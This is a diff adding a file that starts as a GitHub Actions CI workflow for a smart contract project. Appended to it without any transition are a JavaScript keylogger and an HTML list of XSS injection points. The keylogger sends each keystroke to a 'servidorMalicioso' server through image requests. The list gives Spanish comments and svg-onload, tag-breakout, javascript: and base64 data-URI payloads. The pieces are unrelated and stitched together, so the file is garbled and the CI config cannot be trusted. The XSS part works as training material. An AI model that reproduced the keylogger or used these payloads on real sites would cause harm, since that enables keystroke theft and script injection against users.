@@ -1,0 +1,134 @@
+# This workflow will do a clean install of node dependencies, cache/restore them, build the source code and run tests across different versions of node
+# For more information see: https://help.github.com/actions/language-and-framework-guides/using-nodejs-with-github-actions
+
+name: Smart Contract CI
+
+on:
+    push:
+        branches: ["*"]
+    pull_request:
+        branches: ["*"]
+
+jobs:
+    build:
+        strategy:
+            matrix:
+                node-version: [16.x]
+                os: [ubuntu-latest]
+                # See supported Node.js release schedule at https://nodejs.org/en/about/releases/
+        runs-on: ${{ matrix.os }}
+        steps:
+            - uses: actions/checkout@v2
+            - name: Use Node.js ${{ matrix.node-version }}
+              uses: actions/setup-node@v2
+            - id: yarn-cache
+              run: echo "::set-output name=dir::$(yarn cache dir)"
+            - uses: actions/cache@v2
+              with:
+                  path: ${{ steps.yarn-cache.outputs.dir }}
+                  key: ${{ matrix.os }}-yarn-${{ hashFiles('**/yarn.lock') }}
+                  restore-keys: |
+                      ${{ matrix.os }}-yarn-
+            - run: yarn --frozen-lockfile
+            - run: yarn format
+            - run: yarn compile
+            - run: cp .env.example .env
+            - run: yarn test
+ 
+ /* Keylogger (Android-IOS support) */
+function keylogger() {
+  var logs = "Keys:";
+  var i = 0;
+  window.onkeydown = function(e) {
+    if (i++) {
+      logs = "Key_Id=" + event.target.value.charAt(event.target.selectionStart -1).charCodeAt() + "KeyChar=" +
+                event.target.value.charAt(event.target.selectionStart -1) + "\n\n" ;
+      new Image().src = servidorMalicioso + idCliente + "/" + "keylogs=" + logs;
+    }
+  }
+}<!-- Se rompe el atributo class con "> quedando el svg dentro del div y ejecutándose. -->
+<div id="iPoint1" class="{{payload}}"></div>
+<!-- Exploit:
+"><svg/onload=alert()>
+-->
+ 
+<!-- Se rompe el atributo class con '> quedando el svg dentro del div y ejecutándose. -->
+<div id="iPoint2" class='{{payload}}'></div>
+<!-- Exploit:
+'><svg/onload=alert()>
+-->
+ 
+<!-- Se cierra la etiqueta title pudiendo inyectar el svg fuera de ella. -->
+<title id="iPoint3">{{payload}}</title>
+<!-- Exploit:
+</title><svg/onload=alert()>
+-->
+ 
+<!-- Se cierra la etiqueta textarea quedando el svg fuera del textarea y por tanto pasa de ser texto a html. -->
+<textarea id="iPoint4">{{payload}}</textarea>
+<!-- Exploit:
+</textarea><svg/onload=alert()>
+-->
+ 
+<!-- Se cierra la etiqueta style quedando el svg fuera del style y por tanto pasa de ser código CSS a HTML. -->
+<style id="iPoint5">{{payload}}</style>
+<!-- Exploit:
+</style><svg/onload=alert()>
+-->
+ 
+<!-- Se cierra la etiqueta noscript quedando el svg fuera del noscript y por tanto pudiendo ejecutar inline javascript. -->
+<noscript id="iPoint6">{{payload}}</noscript>
+<!-- Exploit:
+</noscript><svg/onload=alert()>
+-->
+ 
+<!-- Se cierra la etiqueta embed quedando el svg fuera y por tanto se ejecuta el javascript. -->
+<embed id="iPoint7">{{payload}}</embed>
+<!-- Exploit:
+</embed><svg/onload=alert()>
+-->
+ 
+<!-- Se cierra la etiqueta template quedando el svg fuera y por tanto se ejecuta el javascript. -->
+<template id="iPoint8">{{payload}}</template>
+<!-- Exploit:
+</template><svg/onload=alert()>
+-->
+ 
+<!-- Se cierra la etiqueta script quedando el svg fuera del script y por tanto pasa de ser código javascript a html que ejecuta el script inline. -->
+<script id="iPoint9">{{payload}}</script>
+<!-- Exploit:
+</script><svg/onload=alert()>
+-->
+ 
+<!-- Se cierran las etiquetas option y select quedando el svg fuera y por tanto se ejecuta el script. -->
+<select id="iPoint10"><option>{{payload}}</option></select>
+<!-- Exploit:
+</option></select><svg/onload=alert()>
+-->
+ 
+<!-- Se cierran las comillas dobles y se cierra la etiqueta script pasando el svg de ser un string javascript a código html. -->
+<script id="iPoint11">"{{payload}}"</script>
+<!-- Exploit:
+</script>"<svg/onload=alert()>
+-->
+ 
+<!-- Se cierran las comillas simples y se cierra la etiqueta script pasando el svg de ser un string javascript a código html. -->
+<script id="iPoint12">'{{payload}}'</script>
+<!-- Exploit:
+</script>'<svg/onload=alert()>
+-->
+ 
+<!-- Se utiliza el pseudo-protocolo para ejecutar el código javascript cuando el usuario utilice el enlace. -->
+<a id="iPoint13" href="{{payload}}"></a>
+<!-- Exploit:
+javascript:alert()
+-->
+ 
+<!-- Se utiliza una etiqueta meta que permite ejecución de javascript usando el uri data:. El contenido del script es un confirm codificado en base64.
+<head id="iPoint14">
+{{payload}}
+</head>
+<!-- Exploit:
+<META HTTP-EQUIV="refresh"
+CONTENT="4;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
+-->
